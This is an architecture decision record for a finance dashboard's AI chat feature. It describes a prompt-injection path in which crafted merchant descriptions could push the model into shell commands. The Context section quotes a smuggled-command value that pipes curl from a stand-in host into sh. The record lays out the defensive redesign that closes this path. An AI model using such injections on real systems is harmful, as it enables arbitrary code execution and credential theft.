# ADR-0026: Free-text chat via a tool-less host CLI and server-side read-only data tools

- **Date:** 2026-11-02
- **Status:** Accepted
- **Area:** AI / Security / Privacy
- **Owners:** Finance Dashboard maintainers

## Context

`/chat` used to spawn `kiro-cli chat --agent finance-chat`, whose only tool was
`execute_bash` allow-listed by the regex `scripts/chat-db-readonly.sh "SELECT .+"`. The
`.+` accepted `SELECT 1"; curl evil | sh; echo "` and `$(…)`. The model reads untrusted
merchant descriptions on every turn, so a crafted description was a prompt-injection path to
arbitrary commands as the host user. The child inherited HOME/PATH and could read `.env`
(Trello #43). The hand-made `finance_chat_ro` role on the primary database could also read
`"BankCredential"`.

Card #20 asks for the same feature on the host-installed Hermes Agent, which the
categorizer already uses (ADR-0009 / README "Using Hermes Agent"). Kiro is to stay as a
fallback or be dropped.

## Decision

1. **The model gets no tools on the host.** Each model call is a fresh one-shot run:
   - Hermes: `hermes chat --oneshot --quiet --safe-mode --source tool --max-turns 1 --toolsets todo --query-file <0600 file in an empty 0700 temp dir>`, with that temp dir as cwd.
   - Kiro: the `finance-chat` agent with `tools: []` and the prompt as its runtime resource.

   The spawn uses an argument array (no shell), caps output at 256 KB, and times out
   (`CHAT_TIMEOUT_MS`, default 120 s). The child environment is an allowlist (PATH, HOME,
   USER, LOGNAME, SHELL, TMPDIR, TZ, LANG, LC_ALL, HERMES_HOME). It never contains
   `DATABASE_URL`, `CHAT_DB_URL` or `ENCRYPTION_KEY`.
2. **The server is the only party that touches the database.** It runs a bounded tool loop
   (`chatLoop.ts`, at most `CHAT_MAX_ROUNDS` = 4, hard cap 6). The model replies with a
   single JSON object between per-call nonce markers. That object is either
   `{"type":"answer"}` or `{"type":"tools","calls":[…]}` with up to 3 calls. The server
   validates each call, runs it, redacts the result, and replays it in the next round. On the
   last round the model is told it must answer.
3. **Typed tools come first, raw SQL second.** The typed tools are `spending_by_category`,
   `monthly_totals`, `top_merchants`, `list_transactions`, `account_balances` and `budgets`.
   They are fixed SQL with bound parameters, and their semantics match analyticsService:
   transfers, investments and card settlements are excluded, `isRefund` rows count as
   +|amount| income and never as spend (SQL mirror of `classifyFlow`, ADR-0024), and each
   currency is reported separately. The `query` tool accepts model-written SQL only when it passes
   `chatSqlValidator.ts`:
   - it parses (`pgsql-ast-parser`) to exactly one SELECT, UNION or WITH-of-SELECTs;
   - every node type, function, keyword, cast and table must be on an allowlist;
   - schema-qualified names, `$n`, `$$`, row locks, `INTO`, recursive CTEs, CTE names that
     shadow tables, and sensitive column names are refused;
   - the statement that runs is the re-serialized AST, not the model's text.
4. **Scoping and database enforcement.** Every query, typed or raw, runs as a subquery
   under CTEs named like the tables. Each CTE exposes only allowlisted columns, applies the
   page's household-member filter (`$1`) and drops `isCardSettlement` rows. A `LIMIT` of
   200+1 rows caps the result. Execution uses a separate Prisma client on `CHAT_DB_URL` as
   `finance_chat_ro`, inside `SET TRANSACTION READ ONLY` with `SET LOCAL statement_timeout = '5s'`.

   The role is defined by the idempotent `scripts/setup-chat-readonly-role.sql`:
   - it has column-level SELECT only, with no `BankCredential`, `accountNumber`,
     `txnIdentifier` or `email`;
   - `default_transaction_read_only=on`, `statement_timeout=5s`, `NOSUPERUSER`,
     `NOBYPASSRLS`, and `CONNECTION LIMIT 4`;
   - every run revokes all existing privileges and re-grants only the allowlist.

   It is a script rather than a migration because roles are cluster-wide objects and must
   not carry a password. On first use, the app refuses to run if the role turns out to be a
   superuser, can write, or can read credentials or account numbers. A missing
   `CHAT_DB_URL` fails fast with a configuration error.
5. **Privacy model.** The chat is opt-in (`CHAT_ENABLED=true`, off by default). The page
   discloses that questions and looked-up data go to the model provider configured in
   Hermes (or Kiro).
   - What leaves the machine: the question, the capped history, category names, and tool
     results (amounts, dates, balances, account display names, member names, and
     descriptions/memos/notes passed through `redactTransactionDescription`, so long
     numbers become `<number>`).
   - What never leaves: credentials, account numbers, bank transaction identifiers and
     e-mails. The DB role cannot read them in the first place.
   - Retention: history is kept in server memory only (15-minute TTL, 6 turns / 8,000
     characters), and nothing is persisted by the app. *Superseded by ADR-0028:
     conversations are now persisted in the finance database; the replay caps remain.* Hermes and Kiro may keep their own
     local transcripts (`--source tool` hides Hermes runs from its picker).
6. **Cost bounds.** Chat work is serialized. A global limit allows
   `CHAT_RATE_LIMIT_PER_MINUTE` messages (default 6), each with at most 4 model calls.
7. **Kiro decision:** Kiro stays as an opt-in fallback (`CHAT_CLI=kiro`) because, with
   `tools: []` and the same server-side loop, it is exactly as safe as Hermes, and it costs
   only a second command builder. `scripts/chat-db-readonly.sh` and `execute_bash` are
   removed. Hermes is the default.
8. **Unchanged access controls.** The loopback check (`isLoopbackRequest`), the CSRF/Host
   guard (ADR-0019) and the loopback/tailnet bind (ADR-0018) still apply to the chat.

Non-goals (v1): streaming tokens, agent-generated charts, persistent chat history, write
actions, and using Hermes' own session resume. The server replays history instead, so no
CLI-side state is needed.

## Consequences

### Positive
- Prompt injection can no longer reach a shell. At worst it makes the model request extra
  read-only lookups the user could see anyway, or give a wrong answer.
- Several independent layers block writes and credential reads: the validator, the scoping
  CTEs, the column grants, the READ ONLY transaction and role default, and the startup
  privilege check.
- The household filter is enforced by the server, not requested from the model.
- One LLM runtime (Hermes) for both categorization and Q&A. No new API keys or vendors.
- The UI lists every lookup under each answer, for transparency.

### Negative / risks
- Hermes does not document a "zero tools" mode. `--toolsets todo` plus `--safe-mode` plus
  `--max-turns 1` is the narrowest documented combination, but it must be verified on the
  host (`hermes tools --summary`, smoke test below). The empty temp cwd and the stripped
  environment are a backstop.
- `pgsql-ast-parser` does not cover all PostgreSQL syntax, so some valid SELECTs are refused
  (fail closed; the typed tools cover common questions).
- Each round is a full CLI start and one model call. A tool question takes about two calls
  and can be slow.
- The role must be re-granted (`setup-chat-readonly-role.sql`) after migrations add columns
  to allowlisted tables, or the new columns stay invisible to the chat.
- Roles are cluster-wide: running the script changes `finance_chat_ro` on every database in
  that Postgres cluster. It removes a pre-existing `BankCredential` grant on the database
  it runs against.

## Alternatives considered

- **Keep `execute_bash` with a stricter regex.** Rejected. Regex allowlists over shell
  strings are not a security boundary.
- **A local MCP server exposing the data tools to Hermes.** Deferred. `--safe-mode`
  disables MCP servers. Enabling MCP would also re-enable the user's other MCP servers
  and config, and it gives the model a live tool channel. The server-side loop keeps every
  call under app control and is easier to test.
- **Typed tools only (no raw SQL).** Rejected for v1. Free-text questions are too varied.
  The validator plus the DB role make the raw path acceptable, and the typed tools are
  preferred in the prompt.
- **A role migration.** Rejected. A password cannot be committed, roles are cluster-wide,
  and `migrate deploy` must not need superuser rights.
- **Drop Kiro entirely.** Not needed. The tool-less agent is equally safe and helps hosts
  that already have Kiro.

## Follow-up

- On the primary machine:
  1. Run the role script.
  2. Set the role password.
  3. Configure `CHAT_ENABLED` / `CHAT_DB_URL`.
  4. Run `hermes doctor` and `hermes tools --summary`.
  5. Smoke test (README "Chat (free-text Q&A)").
- Verify that a real Hermes run with the chat flags cannot execute a shell command (ask it
  to run `id` and confirm it cannot).

## References

- Trello #20 (Hermes Q&A), #43 (replace execute_bash), #44 / ADR-0018, #45 / ADR-0019
- `src/lib/services/chatSqlValidator.ts`, `chatTools.ts`, `chatProtocol.ts`, `chatLoop.ts`,
  `chatCli.ts`, `chatReadonlyDb.ts`, `chatService.ts`, `src/app/api/chat/route.ts`
- `scripts/setup-chat-readonly-role.sql`, `.kiro/agents/finance-chat.json`
- Hermes CLI reference: https://hermes-agent.nousresearch.com/docs/reference/cli-commands
